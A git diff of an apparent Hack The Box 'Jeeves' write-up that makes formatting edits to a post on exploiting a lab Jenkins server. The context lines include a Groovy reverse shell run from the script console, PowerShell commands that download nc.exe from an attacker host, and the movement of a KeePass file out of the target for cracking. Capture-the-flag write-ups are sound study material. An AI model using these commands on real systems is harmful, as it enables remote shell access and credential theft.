@@ -73,7 +73,11 @@ This allows us to either upload a malicious .exe file through job creation or ru
 ***
 
 # Exploitation
-Navigate to the script console (*Manage Jenkins -> Script Console*) - `http://10.10.10.63:50000/askjeeves/script`. This allows us to run arbitrary GroovyScript (similar to java) commands. Doing a bit of research, I find a GroovyScript reverse shell on [GitHub](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).
+Navigate to the script console (*Manage Jenkins -> Script Console*) - `http://10.10.10.63:50000/askjeeves/script`. 
+
+<img src="/img/blog/htb-jeeves/htb-jeeves-03,5.png">
+
+This allows us to run arbitrary GroovyScript (similar to java) commands. Doing a bit of research, I find a GroovyScript reverse shell on [GitHub](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).
 
 {% highlight java %}
 String host="localhost";
@@ -88,6 +92,8 @@ If we rewrite the port and the host, we should be able to get a nice netcat reve
 
 Awesome! User's hash is located at `C:\Users\kohsuke\Desktop`. Go and get it! 
 
+***
+
 # Privilege escalation
 Unfortunately, we still need to escalate our privileges in order to capture all the flags. There are two main methods of doing so - cracking of .kdbx file and token impersonation (*rotten potato method*). Below, the first method will be described. 
 
@@ -101,7 +107,7 @@ powershell -c '(new-object System.Net.WebClient).DownloadFile("http://IP/nc.exe"
 powershell -c 'Invoke-WebRequest "http://IP/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"' 
 {% endhighlight %}
 
->> Note: Don't forget to start a web server before you actually try to download a file.
+> Note: Don't forget to start a web server before you actually try to download a file.
 
 Thanks to **netcat**, we are able to transfer the .kdbx file into our filesystem. We can then proceed to generate a hash with **keepass2john**.
 ```console
